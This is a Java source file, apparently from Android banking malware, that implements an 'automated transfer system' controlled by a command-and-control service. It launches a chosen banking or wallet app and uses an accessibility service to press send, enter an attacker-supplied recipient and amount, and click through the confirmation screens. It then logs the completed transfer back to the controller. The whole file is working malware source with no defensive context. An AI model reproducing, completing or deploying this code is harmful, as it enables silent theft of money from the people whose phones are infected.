package com.wuzenx.engine;

import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;
import com.wuzenx.C2Service;
import com.wuzenx.services.WuzenAccessibilityService;

public class AutoTransfer {
    private C2Service c2;
    private boolean active = false;
    private int step = 0;
    private Handler handler = new Handler(Looper.getMainLooper());
    private Config config;

    public static class Config {
        public String appPackage;
        public String recipient;
        public String amount;
        public Config(String appPackage, String recipient, String amount) {
            this.appPackage = appPackage;
            this.recipient = recipient;
            this.amount = amount;
        }
    }

    public AutoTransfer(C2Service c2) { this.c2 = c2; }

    public void start(Config config) {
        this.config = config;
        active = true;
        step = 0;
        try {
            Intent intent = c2.getPackageManager().getLaunchIntentForPackage(config.appPackage);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                c2.startActivity(intent);
            }
            handler.postDelayed(() -> flow(), 3000);
        } catch (Exception ignored) {}
        c2.sendMessage("log", "ATS started: " + config.amount + " to " + config.recipient);
    }

    public void stop() { active = false; handler.removeCallbacksAndMessages(null); step = 0; }
    
    private void flow() {
        if (!active) return;
        switch (step) {
            case 0: click("send", "transfer", "pay", "withdraw", "send now");
                step++; handler.postDelayed(() -> flow(), 2000); break;
            case 1: type(config.recipient, "address", "wallet", "recipient", "to", "enter address");
                step++; handler.postDelayed(() -> flow(), 2000); break;
            case 2: type(config.amount, "amount", "value", "quantity", "enter amount");
                step++; handler.postDelayed(() -> flow(), 2000); break;
            case 3: click("next", "continue", "review", "preview");
                step++; handler.postDelayed(() -> flow(), 2000); break;
            case 4: click("confirm", "send", "approve", "confirm send");
                step++; handler.postDelayed(() -> flow(), 2000); break;
            case 5: click("confirm", "approve", "yes", "ok");
                handler.postDelayed(() -> {
                    c2.sendMessage("log", "ATS complete: " + config.amount + " → " + config.recipient);
                    stop();
                }, 2000); break;
        }
    }

    private void click(String... texts) {
        AccessibilityNodeInfo root = WuzenAccessibilityService.instance != null ?
            WuzenAccessibilityService.instance.getRootInActiveWindow() : null;
        if (root != null) { findAndClick(root, texts); root.recycle(); }
    }

    private void type(String text, String... descs) {
        AccessibilityNodeInfo root = WuzenAccessibilityService.instance != null ?
            WuzenAccessibilityService.instance.getRootInActiveWindow() : null;
        if (root != null) { findAndType(root, text, descs); root.recycle(); }
    }

    private boolean findAndClick(AccessibilityNodeInfo node, String... texts) {
        if (node == null) return false;
        String t = node.getText() != null ? node.getText().toString().toLowerCase() : "";
        String d = node.getContentDescription() != null ? node.getContentDescription().toString().toLowerCase() : "";
        for (String s : texts) { if (t.contains(s) || d.contains(s)) { if (node.isClickable()) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); return true; } } }
        for (int i = 0; i < node.getChildCount(); i++) { try { AccessibilityNodeInfo c = node.getChild(i); if (c != null) { if (findAndClick(c, texts)) return true; } } catch (Exception ignored) {} }
        return false;
    }

    private void findAndType(AccessibilityNodeInfo node, String text, String... descs) {
        if (node == null) return;
        String t = node.getText() != null ? node.getText().toString().toLowerCase() : "";
        String d = node.getContentDescription() != null ? node.getContentDescription().toString().toLowerCase() : "";
        for (String s : descs) { if (t.contains(s) || d.contains(s)) { if (node.isEditable()) { node.performAction(AccessibilityNodeInfo.ACTION_FOCUS); android.os.Bundle b = new android.os.Bundle(); b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text); node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b); return; } } }
        for (int i = 0; i < node.getChildCount(); i++) { try { AccessibilityNodeInfo c = node.getChild(i); if (c != null) { findAndType(c, text, descs); } } catch (Exception ignored) {} }
    }
}
